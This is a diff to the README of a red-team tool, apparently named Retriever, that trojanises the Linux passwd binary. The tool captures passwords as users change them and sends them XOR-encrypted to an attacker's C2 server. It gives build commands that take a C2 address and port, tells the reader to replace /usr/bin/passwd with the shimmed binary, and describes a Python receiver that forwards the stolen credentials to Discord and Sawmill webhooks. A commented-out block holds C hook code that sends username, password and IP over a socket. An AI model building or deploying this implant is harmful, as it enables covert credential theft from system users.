@@ -1,58 +1,72 @@
-# Retriever Passwd Shim
+# Retriever passwd Shim
 
-#### What is this
-This is a basic Linux binary shim on the passwd binary from the shadow package. This will grab new passwords while they are still plaintext in the binary and remotely send it back to a defined C2.
+#### What is this?
+This is a basic Linux binary shim method on the `passwd` binary from the shadow package. This will grab new passwords while they are being changed using the binary and send it back to a defined C2.
 
 #### What does it work on? (Tested)
 
-Ubuntu - 18.04, 20.04 <br />Centos - 8 <br />Debian - 11 <br />  
+Ubuntu - 18.04+ <br />Centos - 8+ <br />Debian - 11+ <br />Arch - ???  
 
 #### What is this intended for 
-This is intended for Red Teaming in a Competition environment.
-<br/><br/>
-## Installation Instructions
-#### Ubuntu - 18.04 / 20.04
-1. `clone shadow git`
-2. `run ./generate.sh`
-3. `sudo chmod 4755 passwd`
+This is intended for red teaming in a competition environment.<br><br>
 
-#### Debian - 11
-1. `clone shadow git`
-2. `run ./generate.sh`
-3. `sudo chmod 4755 passwd`
+## Build Instructions
+### Dependancies
+The dependancies for this project are listed below. There are also prepared commands to install dependancies using different package managers and distros. 
+	
+	git make wget autoconf autopoint libtool xsltproc
+#### Distro Examples
+##### Ubuntu
+	apt install -y git make autoconf autopoint libtool xsltproc
+##### RHEL Based
+	yum install -y git make autoconf gettext-devel libtool libxslt
+##### Arch
+	pacman -Syu --noconfirm git make autoconf gettext libtool libxslt
+##### Alpine
+	apk add git make autoconf gettext-dev libtool libxslt
+### Run Build Script
+Clone the Retriever repository. The most up to date version is most likely the best one. 
+	
+	git clone https://github.com/P4ral1ax/Retriever
+Run the `generate.sh` script as a superuser. It will display the variables entered and then it will start the build process. If you would like to change the parameteres you can run the script again and it should run much faster and it WILL overwrite existing files. 
+	
+	./generate.sh {C2 Address} {Port} {Inferface} {XOR Password}
+The generated binary will be placed in the Retriever directory with the correct permissions. If the file does not appear the build process has failed.
 
-#### CentOS - 8
-1. `clone shadow git`
-2. `yum deplist passwd | awk '/provider:/ {print $2}' | sort -u | xargs yum -y install`
-3. `yum install -y autoconf gettext-devel automake`
-4. `dnf group install "Development Tools"`
-5. `run ./autogen.sh --without-selinux`
-6. `Add Hook (See Hooking passwd.c)`
-7. `sudo make all`
-6. `sudo chmod 4755 passwd`
+Parameter definitions :
+- **C2 Address** : IP address credentials will be sent to
+- **Port**		 : Destination port to send credentials to  	
+- **Interface**  : The interface that the binary will use on the machine to send credentials
+- **XOR Password**: The password used to encrypt the credentials 
 
-#### Troubleshooting
-1. Try "make clean" if you are not getting the changed code
-2. Building from apt-source kinda sucks don't do it if you don't have to
-<br/><br/>
+### Install
+To install the implant it is easy as replacing the original `passwd` binary on the system with the shimmed binary. Common location for this binary is `/usr/bin/passwd` and `/bin/passwd`. <br><br>
+
 ## Using the Python C2
-### .env File
+This tool includes a simple server to recieve the credentals beaconed by the binary. This includes XOR decryption, parsing, and forwarding to a Discord and Sawmill webhook. 
 
-The python C2 expects a .env file to provide both the XOR key as well as a discord webhook to send the credentials to. The two values that the program searches for are "WEBHOOK" and "XOR_KEY". Set these values to their desired value and the program should run with those settings. The default for the XOR_KEY is "bingus" and the default webhook is empty. 
+A custom server could easily be used with retriever if desired. 
+#### Pip Dependancies  
+	python-dotenv requests
+#### .env File
+
+The python C2 expects a .env file to provide various parameters to run correctly. The C2 will run without a .env file but it highly recommended that it is utilized. 
 
 #### .env Values
 
-- WEBHOOK : Set the Discord Webhook (Default : none)
-- XOR_KEY : The key used to encrypt and decrypy (Default : bingus) 
-- PORT    : Set the port the program listens on (Default : 8000)
+- **WEBHOOK** 	 : Set the Discord webhook (Default : none)
+- **XOR_KEY** 	 : The key used to encrypt and decrypt (Default : bingus) 
+- **PORT**    	 : Set the port the program listens on (Default : 8000)
+- **SAWMILLURL** : Set the Sawmill URL (Default : none)
 
 ### Running the C2
 
 Make sure firewalls allow traffic into that port then run the python file using Python3.
 
 	python3 recv_pass.py
-<br/><br/>
-## Hooking the passwd.c File
+
+<!---
+## Hooking the passwd.c File Manually
 
 #### At the Top
 Imports needed 
@@ -112,7 +126,7 @@ At line ~210 right above the new_password function is where I put this function 
 		/* I want to get an IPv4 IP address */
 		ifr.ifr_addr.sa_family = AF_INET;
 
-		/* I want IP address attached to set interface - IF MANUAL CHANGE INTERFACE*/
+		/* I want IP address attached to set interface - CHANGE INTERFACE*/
 		strncpy(ifr.ifr_name, ens33, IFNAMSIZ-1);
 		ioctl(fd, SIOCGIFADDR, &ifr);
 		close(fd);
@@ -121,7 +135,7 @@ At line ~210 right above the new_password function is where I put this function 
 		char buffer[256];
 		char * ip;
 		ip = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
-		int j = snprintf(buffer, 256, \"%s:%s:%s\\n\", name, password, ip);
+		int j = snprintf(buffer, 256, "%s:%s:%s\n", name, password, ip);
 		
 		/* Make Socket */
 		int sock = 0, valread;
@@ -156,15 +170,15 @@ At line ~210 right above the new_password function is where I put this function 
 			return -1;
 		}
 
-		/* Encrypt Message  - IF MANUAL CHANGE KEY*/
+		/* Encrypt Message - CHANGE KEY*/
 		char* key  = "KEY_HERE";
 		int key_length = strlen(key);
 		int mes_length = strlen(buffer);
 		char* xor_message = XORCipher(buffer, key, mes_length, key_length);
 
 		/* Send Message */
-		send(sock , xor_message , strlen(xor_message) , 0); 
-		
+		send(sock , xor_message , mes_length, 0);	
 		return 0;
 
 	}
+--->
